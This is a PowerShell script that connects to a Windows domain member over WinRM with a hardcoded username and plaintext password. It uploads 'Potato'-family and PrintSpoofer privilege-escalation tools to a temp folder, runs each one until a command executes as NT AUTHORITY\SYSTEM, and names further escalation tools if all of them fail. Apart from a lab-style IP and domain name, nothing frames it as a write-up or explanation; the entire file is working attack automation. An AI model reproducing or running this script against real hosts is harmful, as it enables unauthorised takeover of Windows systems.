[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Target = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$TargetFqdn = "mbr01.child.cadre.local",
    [Parameter(Mandatory=$false)]
    [string]$Username = "child.cadre.local\analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$RemoteDir = "C:\Windows\Temp\cadre-tools",
    [Parameter(Mandatory=$false)]
    [int]$TimeoutMs = 30000
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($Username, $securePass)

function Resolve-ToolPath($name) {
    $src = Join-Path $ToolSource $name
    if (Test-Path $src) { return $src }
    $alt = Get-ChildItem $ToolSource -Filter ($name -replace '^(.*)\.exe$','$1*') | Select-Object -First 1
    if ($alt) { return $alt.FullName }
    return $null
}

function New-MbrSession() {
    $sess = New-PSSession -ComputerName $Target -Credential $cred -Port 5985 -ErrorAction Stop
    return $sess
}

function Copy-Tool($name, $session) {
    $src = Resolve-ToolPath $name
    if (-not $src) { throw "Missing $name in $ToolSource" }
    $remotePath = Join-Path $RemoteDir $name
    Copy-Item -Path $src -Destination $remotePath -ToSession $session -Force
    $info = Invoke-Command -Session $session -ScriptBlock { param($p) Get-Item $p } -ArgumentList $remotePath
    Write-Output "COPIED:$name -> $remotePath ($($info.Length) bytes)"
}

function Invoke-RemoteTool($name, $arguments, $session) {
    $remotePath = Join-Path $RemoteDir $name
    $result = Invoke-Command -Session $session -ScriptBlock {
        param($exe, $arg, $timeout)
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $exe
        $psi.Arguments = $arg
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $completed = $proc.WaitForExit($timeout)
        if (-not $completed) {
            try { $proc.Kill() } catch {}
            [PSCustomObject]@{ StdOut = $proc.StandardOutput.ReadToEnd(); StdErr = $proc.StandardError.ReadToEnd(); ExitCode = -1; TimedOut = $true }
        } else {
            [PSCustomObject]@{ StdOut = $proc.StandardOutput.ReadToEnd(); StdErr = $proc.StandardError.ReadToEnd(); ExitCode = $proc.ExitCode; TimedOut = $false }
        }
    } -ArgumentList $remotePath, $arguments, $TimeoutMs
    $result.StdOut.Split("`n") | ForEach-Object { Write-Output "OUT:$_" }
    $result.StdErr.Split("`n") | ForEach-Object { Write-Output "ERR:$_" }
    Write-Output "EXIT:$($result.ExitCode) TIMED_OUT:$($result.TimedOut)"
    return $result
}

function Test-System($output) {
    return ($output | Out-String) -match 'nt\s*authority\s*\\\s*system'
}

$candidates = @(
    @{ Name = "GodPotato-NET4.exe"; Args = '-cmd "cmd /c whoami"' }
    @{ Name = "SweetPotato.exe"; Args = '-p cmd.exe -a "/c whoami"' }
    @{ Name = "JuicyPotatoNG.exe"; Args = '-t * -p cmd.exe -a "/c whoami"' }
    @{ Name = "PrintSpoofer64.exe"; Args = '-i -c cmd /c whoami' }
)

$results = @()
$working = $null

$sess = New-MbrSession

try {
    Invoke-Command -Session $sess -ScriptBlock { param($d) New-Item -ItemType Directory -Force -Path $d | Out-Null } -ArgumentList $RemoteDir
    Write-Output "REMOTE_DIR:$RemoteDir ensured"

    foreach ($c in $candidates) {
        $name = $c.Name
        $args = $c.Args
        Write-Output "=== TRYING $name ==="
        if (-not (Resolve-ToolPath $name)) {
            Write-Output "SKIP:$name not present in $ToolSource"
            $results += [PSCustomObject]@{ Tool = $name; Status = "SKIP" }
            continue
        }
        try {
            Copy-Tool $name $sess
            $out = Invoke-RemoteTool $name $args $sess
            if ($out.TimedOut) {
                Write-Output "TIMEOUT:$name after ${TimeoutMs}ms"
                $status = "TIMEOUT"
            } elseif (Test-System $out.StdOut) {
                Write-Output "SUCCESS:$name -> SYSTEM"
                $working = $name
                $status = "SUCCESS"
            } else {
                Write-Output "FAIL:$name did not return SYSTEM"
                $status = "FAIL"
            }
        } catch {
            Write-Output "ERROR:${name}:$($_.Exception.Message)"
            $status = "ERROR"
        }
        $results += [PSCustomObject]@{ Tool = $name; Status = $status }
        if ($working) { break }
    }
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

Write-Output "=== SUMMARY ==="
$results | Format-Table -AutoSize
if ($working) {
    Write-Output "LPE_OK:$working"
    exit 0
} else {
    Write-Output "LPE_FAIL: no candidate returned SYSTEM."
    Write-Output "Next steps: try FullPowers to restore token privileges, or KrbRelayUp (Kerberos relay LPE)."
    exit 1
}
